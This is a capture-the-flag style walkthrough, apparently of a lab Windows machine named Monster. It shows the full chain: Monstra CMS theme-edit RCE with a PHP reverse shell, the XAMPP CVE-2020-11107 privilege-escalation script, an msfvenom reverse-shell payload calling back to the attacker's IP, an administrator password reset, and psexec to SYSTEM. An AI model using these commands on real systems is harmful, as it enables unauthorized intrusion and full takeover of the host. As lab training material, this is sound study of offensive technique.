##### Tags: `monstra`  `xampp`  `SeImpersonatePrivilege`  `exploitdb` 

# 🪟 Monster 🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.159.180

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
port 135,139,445 rpc and smb unable to connect  
port 80 and 443 is the same webpage running Monstra 3.0.4  
gobuster find /blog
```console
$ gobuster dir -u http://192.168.159.180 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 302,404
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.159.180
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   302,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 342] [--> http://192.168.159.180/blog/]
```
there is a Users page in /blog  
got 2 users
```console
mike
mike@monster.pg

admin
wazowski@monster.pg
```
admin wazowski login successfully  
for Monstra 3.0.4 we have RCE via Theme Blog  
https://github.com/monstra-cms/monstra/issues/470  
use a PHP Ivan Sincek to replace the Theme Blog and save it
```console
https://www.revshells.com/
```
go to http://monster.pg/blog/blog to execute the reverse shell
```console
$ penelope -p 443          
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.2.15 • 192.168.45.209
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from MIKE-PC 192.168.159.180 Microsoft_Windows_10_Pro-x64-based_PC 👤 mike-pc\mike • Assigned SessionID <1>                                                                                                   
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/MIKE-PC~192.168.159.180-Microsoft_Windows_10_Pro-x64-based_PC/2026_04_06-16_04_57-447.log                                                                                              
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\xampp\htdocs\blog>whoami
mike-pc\mike
```
## Privilege Escalation
check the version of xampp is running 7.3.10-1
```console
c:\xampp>type properties.ini
[General]
installdir=C:\xampp
base_stack_name=XAMPP
base_stack_key=
base_stack_version=7.3.10-1
base_stack_platform=windows-x64
```
found the powershell script to pe to administrator  
https://www.exploit-db.com/exploits/50337
```console
# Exploit Title: XAMPP 7.4.3 - Local Privilege Escalation
# Exploit Author: Salman Asad (@deathflash1411) a.k.a LeoBreaker
# Original Author: Maximilian Barz (@S1lkys)
# Date: 27/09/2021
# Vendor Homepage: https://www.apachefriends.org
# Version: XAMPP < 7.2.29, 7.3.x < 7.3.16 & 7.4.x < 7.4.4
# Tested on: Windows 10 + XAMPP 7.3.10
# References: https://github.com/S1lkys/CVE-2020-11107

$file = "C:\xampp\xampp-control.ini"
$find = ((Get-Content $file)[2] -Split "=")[1]
# Insert your payload path here
$replace = "C:\temp\msf.exe"
(Get-Content $file) -replace $find, $replace | Set-Content $file
```
generate a reverse shell call msf.exe
```console
$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.209 lport=445 -f exe > msf.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
upload msf.exe to the machine then follow the script
```console
PS C:\xampp> $file = "C:\xampp\xampp-control.ini"
```
```console
PS C:\xampp> $find = ((Get-Content $file)[2] -Split "=")[1]
[1]
```
```console
PS C:\xampp> $replace = "C:\xampp\msf.exe"
```
```console
PS C:\xampp> (Get-Content $file) -replace $find, $replace | Set-Content $file
```
execute the payload
```console
c:\xampp>xampp-control.exe
```
got the administrator shell
```console
$ penelope -p 445
[+] Listening for reverse shells on 0.0.0.0:445 →  127.0.0.1 • 10.0.2.15 • 192.168.45.209
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from MIKE-PC 192.168.159.180 Microsoft_Windows_10_Pro-x64-based_PC 👤 mike-pc\administrator • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/MIKE-PC~192.168.159.180-Microsoft_Windows_10_Pro-x64-based_PC/2026_04_06-16_46_00-960.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\WINDOWS\system32>whoami
whoami
mike-pc\administrator
```
change the password of administrator
```console
C:\Users\Public>net user Administrator 123
net user Administrator 123
The command completed successfully.
```
run impacket-psexec to get the system shell
```console
$  impacket-psexec mike-pc/Administrator:'123'@192.168.159.180
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.159.180.....
[*] Found writable share ADMIN$
[*] Uploading file jhTaCvzG.exe
[*] Opening SVCManager on 192.168.159.180.....
[*] Creating service pPFc on 192.168.159.180.....
[*] Starting service pPFc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system
```
